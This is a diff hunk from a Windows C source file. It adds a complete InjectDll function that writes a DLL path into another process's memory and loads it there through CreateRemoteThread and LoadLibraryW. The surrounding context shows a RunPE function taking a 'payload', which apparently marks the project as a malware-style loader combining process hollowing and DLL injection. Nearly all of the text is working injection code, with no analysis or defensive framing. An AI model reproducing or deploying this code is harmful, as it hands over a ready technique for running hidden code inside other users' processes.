@@ -660,6 +660,41 @@ BOOL IsExecutable64Bit(LPBYTE image, LPBOOL is64Bit)
 
 	return FALSE;
 }
+BOOL InjectDll(DWORD processId, LPCWSTR dllPath)
+{
+	BOOL result = FALSE;
+
+	HANDLE process = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
+	if (process)
+	{
+		HMODULE module = GetModuleHandleW(L"kernel32.dll");
+		if (module)
+		{
+			LPVOID loadLibraryAddress = (LPVOID)GetProcAddress(module, "LoadLibraryW");
+			if (loadLibraryAddress)
+			{
+				DWORD dllPathSize = (lstrlenW(dllPath) + 1) * sizeof(WCHAR);
+				LPVOID allocatedMemoryAddress = VirtualAllocEx(process, NULL, dllPathSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
+				if (allocatedMemoryAddress)
+				{
+					if (WriteProcessMemory(process, allocatedMemoryAddress, dllPath, dllPathSize, NULL))
+					{
+						HANDLE thread = CreateRemoteThread(process, NULL, NULL, (LPTHREAD_START_ROUTINE)loadLibraryAddress, allocatedMemoryAddress, 0, NULL);
+						if (thread)
+						{
+							CloseHandle(thread);
+							result = TRUE;
+						}
+					}
+				}
+			}
+		}
+
+		CloseHandle(process);
+	}
+
+	return result;
+}
 BOOL RunPE(LPCWSTR path, LPBYTE payload)
 {
 	BOOL isPayload64Bit;
